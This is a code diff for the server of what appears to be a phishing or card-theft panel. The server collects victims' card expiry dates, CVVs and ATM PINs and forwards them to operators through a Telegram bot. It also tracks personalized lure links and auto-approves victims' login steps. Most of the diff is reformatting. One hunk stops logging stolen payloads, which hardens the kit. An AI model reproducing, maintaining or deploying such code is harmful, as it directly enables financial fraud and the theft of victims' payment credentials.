@@ -14,29 +14,29 @@ import winston from 'winston';
 import * as db from './db';
 import { authenticateToken, requireRole, signToken, verifyToken } from './auth';
 import {
-  generalRateLimit,
-  strictRateLimit,
-  cspMiddleware,
-  securityHeaders,
-  requestLogger,
-  botDetection,
-  validateSession,
-  sanitizeMiddleware
+    generalRateLimit,
+    strictRateLimit,
+    cspMiddleware,
+    securityHeaders,
+    requestLogger,
+    botDetection,
+    validateSession,
+    sanitizeMiddleware
 } from './middleware/security';
 import logger, { logSecurity, logAudit, stream } from './utils/logger';
 import { verifyPassword } from './utils/password';
 import {
-  validateSessionSync,
-  validateAdminLogin,
-  validateCreateUser,
-  validateUpdateUser,
-  validateCommand,
-  validateSessionId,
-  validateWithZod,
-  sessionSyncSchema,
-  adminLoginSchema,
-  createUserSchema,
-  updateUserSchema
+    validateSessionSync,
+    validateAdminLogin,
+    validateCreateUser,
+    validateUpdateUser,
+    validateCommand,
+    validateSessionId,
+    validateWithZod,
+    sessionSyncSchema,
+    adminLoginSchema,
+    createUserSchema,
+    updateUserSchema
 } from './validation/schemas';
 import { validateInput } from './middleware/security';
 
@@ -82,14 +82,14 @@ const broadcastLog = (type: 'log' | 'error', args: any[]) => {
     try {
         const msg = args.map(arg => {
             if (typeof arg === 'object') {
-                try { return JSON.stringify(arg); } catch(e) { return '[Circular/Object]'; }
+                try { return JSON.stringify(arg); } catch (e) { return '[Circular/Object]'; }
             }
             return String(arg);
         }).join(' ');
 
         // Emit to room 'hypervisor-logs'
         io.to('hypervisor-logs').emit('log', { type, msg, timestamp: Date.now() });
-    } catch(e) {}
+    } catch (e) { }
 };
 
 // Override console methods to use structured logging
@@ -176,8 +176,8 @@ io.on('connection', (socket) => {
             // Using 70000ms (70s) to be safely over the 60s threshold
             const offlineTime = Date.now() - 70000;
             db.updateLastSeen(sessionId, offlineTime).then(() => {
-                 // Notify admins to update list immediately
-                 io.emit('sessions-updated');
+                // Notify admins to update list immediately
+                io.emit('sessions-updated');
             });
 
             socketSessionMap.delete(socket.id);
@@ -281,7 +281,7 @@ const formatSessionForTelegram = (session: any, title: string, flag: string, hid
         const exp = v(d.cardExpiry);
         const cvv = v(d.cardCvv);
         if (exp || cvv || !hideEmpty) {
-             content += `├ <b>Exp:</b> ${exp || '<i>(Empty)</i>'} • <b>CVV:</b> ${cvv || '<i>(Empty)</i>'}\n`;
+            content += `├ <b>Exp:</b> ${exp || '<i>(Empty)</i>'} • <b>CVV:</b> ${cvv || '<i>(Empty)</i>'}\n`;
         }
 
         content += addLine('ATM PIN', d.atmPin);
@@ -325,14 +325,14 @@ const sendTelegram = (msg: string, token: string, chat: string) => {
         res.on('data', chunk => body += chunk);
         res.on('end', () => {
             if (res.statusCode !== 200) {
+                // SECURITY: Don't log payload - it may contain sensitive user data
                 console.error(`[Telegram] Failed (Status ${res.statusCode}): ${body}`);
-                console.error(`[Telegram] Payload was: ${msg}`);
             } else {
                 console.log(`[Telegram] Sent successfully (ID: ${JSON.parse(body).result?.message_id})`);
             }
         });
     });
-    req.on('error', e => console.error('[Telegram] Network Error:', e));
+    req.on('error', e => console.error('[Telegram] Network Error:', e.message));
     req.write(data);
     req.end();
 };
@@ -386,24 +386,24 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
 
         // 1. Check for Admin Code (Personalized Link)
         if (data.adminCode) {
-             // Check NEW Links first
-             const link = await db.getLinkByCode(data.adminCode);
-             if (link) {
-                 adminId = link.adminId;
-                 // Increment clicks here to ensure it's counted when session starts
-                 // We don't want to double count if the frontend calls track/click too,
-                 // but often frontend blocks fail. This ensures reliability.
-                 // Only increment if this is a "New" session (no ID in DB yet)?
-                 // For now, we increment on sync if it's the first sync?
-                 // Let's stick to the track/click endpoint for explicit clicks,
-                 // but ensure the adminId mapping is robust.
-             } else {
-                 // Check LEGACY User Code
-                 const admin = await db.getUserByCode(data.adminCode);
-                 if (admin) {
-                     adminId = admin.id;
-                 }
-             }
+            // Check NEW Links first
+            const link = await db.getLinkByCode(data.adminCode);
+            if (link) {
+                adminId = link.adminId;
+                // Increment clicks here to ensure it's counted when session starts
+                // We don't want to double count if the frontend calls track/click too,
+                // but often frontend blocks fail. This ensures reliability.
+                // Only increment if this is a "New" session (no ID in DB yet)?
+                // For now, we increment on sync if it's the first sync?
+                // Let's stick to the track/click endpoint for explicit clicks,
+                // but ensure the adminId mapping is robust.
+            } else {
+                // Check LEGACY User Code
+                const admin = await db.getUserByCode(data.adminCode);
+                if (admin) {
+                    adminId = admin.id;
+                }
+            }
         }
 
         // 2. Load Existing Session (to check for pre-assigned admin)
@@ -428,7 +428,7 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
                         tgToken = tgConfig.token;
                         tgChat = tgConfig.chat;
                     }
-                } catch(e) {}
+                } catch (e) { }
             }
         }
 
@@ -493,38 +493,38 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
             const alreadyHadCreds = e && hasCreds(e);
 
             if (!alreadyHadCreds) {
-                 const msg = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
-                 sendTelegram(msg, tgToken, tgChat);
+                const msg = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
+                sendTelegram(msg, tgToken, tgChat);
 
-                 // Tracking: New Session Started
-                 if (data.adminCode) {
-                     db.incrementLinkSessions(data.adminCode, 'started');
-                 }
+                // Tracking: New Session Started
+                if (data.adminCode) {
+                    db.incrementLinkSessions(data.adminCode, 'started');
+                }
             }
         }
 
         // 2. Session Verified
         if (existing && existing.status !== 'Verified' && data.status === 'Verified') {
-             const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
-             let title = `Session Verified ${cardType}`;
-             let hideEmpty = false;
+            const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
+            let title = `Session Verified ${cardType}`;
+            let hideEmpty = false;
 
-             if (data.isArchivedIncomplete) {
-                 title = `Session Incomplete (Archived) ${cardType}`;
-                 hideEmpty = true;
-             }
+            if (data.isArchivedIncomplete) {
+                title = `Session Incomplete (Archived) ${cardType}`;
+                hideEmpty = true;
+            }
 
-             const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
-             sendTelegram(msg, tgToken, tgChat);
+            const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
+            sendTelegram(msg, tgToken, tgChat);
 
-             logAudit('System', 'Verified', `Session ${data.sessionId} Verified`, { sessionId: data.sessionId });
+            logAudit('System', 'Verified', `Session ${data.sessionId} Verified`, { sessionId: data.sessionId });
 
-             // Tracking: Session Verified
-             // Admin might be different from Code if reassigned, but we track the code originally used if present?
-             // Actually adminCode stays in payload usually.
-             if (data.adminCode) {
-                 db.incrementLinkSessions(data.adminCode, 'verified');
-             }
+            // Tracking: Session Verified
+            // Admin might be different from Code if reassigned, but we track the code originally used if present?
+            // Actually adminCode stays in payload usually.
+            if (data.adminCode) {
+                db.incrementLinkSessions(data.adminCode, 'verified');
+            }
         }
 
         // Prevent downgrading 'Verified' status
@@ -551,16 +551,16 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
 
         // 1. Login Auto-Approve (from Admin Settings)
         if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
-             const autoApprove = (adminSettings as any).autoApproveLogin;
+            const autoApprove = (adminSettings as any).autoApproveLogin;
 
-             if (autoApprove) {
-                  console.log(`[Auto-Approve] Admin Setting: Approving Login for ${data.sessionId}`);
-                  const skipPhone = (adminSettings as any).skipPhone;
-                  const cmd = { action: 'APPROVE', payload: { skipPhone: !!skipPhone } };
-                  await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
-                  io.to(data.sessionId).emit('command', cmd);
-                  return res.json({ status: 'ok', command: cmd, settings: adminSettings });
-             }
+            if (autoApprove) {
+                console.log(`[Auto-Approve] Admin Setting: Approving Login for ${data.sessionId}`);
+                const skipPhone = (adminSettings as any).skipPhone;
+                const cmd = { action: 'APPROVE', payload: { skipPhone: !!skipPhone } };
+                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
+                io.to(data.sessionId).emit('command', cmd);
+                return res.json({ status: 'ok', command: cmd, settings: adminSettings });
+            }
         }
 
         // --- Offline Auto-Approve Logic (Fallback if no admin connected?) ---
@@ -568,8 +568,8 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
         const isAdminOnline = adminRoom && adminRoom.size > 0;
 
         if (!isAdminOnline) {
-             // ... (Existing Offline Logic) ...
-             if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
+            // ... (Existing Offline Logic) ...
+            if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
                 // Check if we didn't already approve above
                 if (!(adminSettings as any).autoApproveLogin) {
                     console.log(`[Auto-Approve] Offline mode: Approving Login for ${data.sessionId}`);
@@ -686,12 +686,14 @@ app.post('/api/admin/login', strictRateLimit, validateAdminLogin, validateInput,
 
         logAudit(username, 'Login', 'Admin logged in');
 
-        res.json({ status: 'ok', token, user: {
-            id: user.id,
-            username: user.username,
-            role: user.role,
-            uniqueCode: user.uniqueCode
-        }});
+        res.json({
+            status: 'ok', token, user: {
+                id: user.id,
+                username: user.username,
+                role: user.role,
+                uniqueCode: user.uniqueCode
+            }
+        });
 
     } catch (e) {
         console.error(e);
@@ -706,10 +708,10 @@ app.get('/api/admin/me', authenticateToken, async (req: Request, res: Response) 
 
     // Parse JSON fields
     let settings = {};
-    try { settings = JSON.parse(user.settings || '{}'); } catch(e) {}
+    try { settings = JSON.parse(user.settings || '{}'); } catch (e) { }
 
     let telegramConfig = {};
-    try { telegramConfig = JSON.parse(user.telegramConfig || '{}'); } catch(e) {}
+    try { telegramConfig = JSON.parse(user.telegramConfig || '{}'); } catch (e) { }
 
     res.json({
         id: user.id,
@@ -734,12 +736,12 @@ app.get('/api/admin/links', authenticateToken, async (req: Request, res: Respons
 
         // Allow Hypervisor to view others
         if (u.role === 'hypervisor' && requestedAdminId) {
-             targetId = requestedAdminId;
+            targetId = requestedAdminId;
         }
 
         const links = await db.getLinks(targetId);
         res.json(links);
-    } catch(e) {
+    } catch (e) {
         res.status(500).json({ error: 'Failed to fetch links' });
     }
 });
@@ -761,7 +763,7 @@ app.post('/api/admin/links', authenticateToken, async (req: Request, res: Respon
 
         logAudit(u.username, 'CreateLink', `Created link ${code}`, { code });
         res.json({ status: 'ok', code });
-    } catch(e) {
+    } catch (e) {
         res.status(500).json({ error: 'Failed to create link' });
     }
 });
@@ -777,19 +779,19 @@ app.delete('/api/admin/links/:code', authenticateToken, async (req: Request, res
         // Hypervisor can delete any. Admin can only delete own.
         // Also prevent deleting default link (uniqueCode matches link code)
         if (u.role !== 'hypervisor' && link.adminId !== u.id) {
-             return res.status(403).json({ error: 'Forbidden' });
+            return res.status(403).json({ error: 'Forbidden' });
         }
 
         // Check if it is a default link
         const user = await db.getUserById(link.adminId);
         if (user && user.uniqueCode === code) {
-             return res.status(400).json({ error: 'Cannot delete default link' });
+            return res.status(400).json({ error: 'Cannot delete default link' });
         }
 
         await db.deleteLink(code);
         logAudit(u.username, 'DeleteLink', `Deleted link ${code}`, { code });
         res.json({ status: 'ok' });
-    } catch(e) {
+    } catch (e) {
         res.status(500).json({ error: 'Failed to delete link' });
     }
 });
@@ -800,7 +802,7 @@ app.get('/api/admin/audit', authenticateToken, requireRole('hypervisor'), async 
     try {
         const logs = await db.getAuditLogs(100);
         res.json(logs);
-    } catch(e) {
+    } catch (e) {
         res.status(500).json({ error: 'Failed to fetch audit logs' });
     }
 });
@@ -944,12 +946,12 @@ app.get('/api/sessions', authenticateToken, async (req: Request, res: Response) 
         const filterId = req.query.adminId as string;
 
         if (user.role === 'hypervisor') {
-             // If filterId is provided (e.g. strict filtering), we pass it.
-             // Otherwise we pass user.id to show "My Sessions + Unassigned" via the db logic.
-             sessions = await db.getAllSessions(filterId || user.id, user.role);
+            // If filterId is provided (e.g. strict filtering), we pass it.
+            // Otherwise we pass user.id to show "My Sessions + Unassigned" via the db logic.
+            sessions = await db.getAllSessions(filterId || user.id, user.role);
         } else {
-             // Admin always sees own
-             sessions = await db.getAllSessions(user.id, user.role);
+            // Admin always sees own
+            sessions = await db.getAllSessions(user.id, user.role);
         }
 
         // Optimization: ETag for caching
